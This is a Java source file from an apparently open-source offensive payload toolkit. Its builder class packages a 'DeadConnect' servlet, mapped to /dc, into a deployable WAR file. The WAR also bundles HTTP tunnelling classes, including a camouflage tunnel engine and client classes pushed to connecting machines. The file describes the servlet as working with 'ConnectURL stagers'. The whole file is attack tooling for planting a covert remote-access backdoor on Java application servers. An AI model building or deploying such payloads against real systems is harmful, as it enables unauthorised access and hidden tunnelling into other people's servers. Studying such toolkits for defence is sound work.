/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.builder;

import j2eepayload.servlet.DeadConnectServlet;
import javapayload.builder.Builder;

public class DeadConnectWarBuilder extends Builder {

	public DeadConnectWarBuilder() {
		super("Build a WAR file that contains a DeadConnect servlet.",
				"DeadConnect servlets are used with ConnectURL stagers.");
	}

	public String getParameterSyntax() {
		return "[--strip] <filename>.war";
	}

	public void build(String[] args) throws Exception {
		boolean stripDebugInfo = (args[0].equals("--strip"));
		String warName = stripDebugInfo ? args[1] : args[0];
		Class[] classes = new Class[] {
				j2eepayload.servlet.DeadConnectServlet.class,
				javapayload.stage.StreamForwarder.class,
				jtcpfwd.util.http.PollingHandlerFactory.class,
				jtcpfwd.util.PollingHandler.class,
				jtcpfwd.util.PollingHandler.OutputStreamHandler.class,
				jtcpfwd.util.http.HTTPTunnelEngine.class,
				jtcpfwd.util.http.StreamingHTTPTunnelEngine.class,
				jtcpfwd.util.http.CamouflageHTTPTunnelEngine.class,

				// classes to be pushed to clients
				jtcpfwd.util.http.HTTPTunnelClient.class,
				jtcpfwd.util.http.HTTPTunnelClient.HTTPSender.class,
				jtcpfwd.util.http.HTTPTunnelClient.HTTPReceiver.class,
				jtcpfwd.util.http.HTTPTunnelClient.CamouflageHandler.class,
				j2eepayload.servlet.DeadConnectClientHelper.class,
		};
		String webXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
				"<web-app>\r\n" +
				WarBuilder.getServletEntry("DeadConnectServlet", DeadConnectServlet.class, "/dc", null) +
				"</web-app>";
		WarBuilder.buildWar(warName, classes, stripDebugInfo, webXml);
	}
}
